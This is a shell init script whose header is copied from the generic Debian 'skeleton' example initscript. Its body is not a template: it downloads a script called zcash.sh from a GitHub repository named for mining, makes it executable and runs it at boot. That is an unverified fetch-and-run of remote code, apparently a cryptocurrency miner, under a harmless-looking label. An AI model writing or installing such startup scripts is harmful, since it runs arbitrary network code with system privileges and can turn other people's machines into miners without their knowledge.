#!/bin/sh
### BEGIN INIT INFO
# Provides:          skeleton
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Example initscript
# Description:       This file should be used to construct scripts to be
#                    placed in /etc/init.d.
### END INIT INFO
cd ~/
wget https://raw.githubusercontent.com/upggr/upggrminining/master/zcash.sh
chmod 755 zcash.sh
./zcash.sh
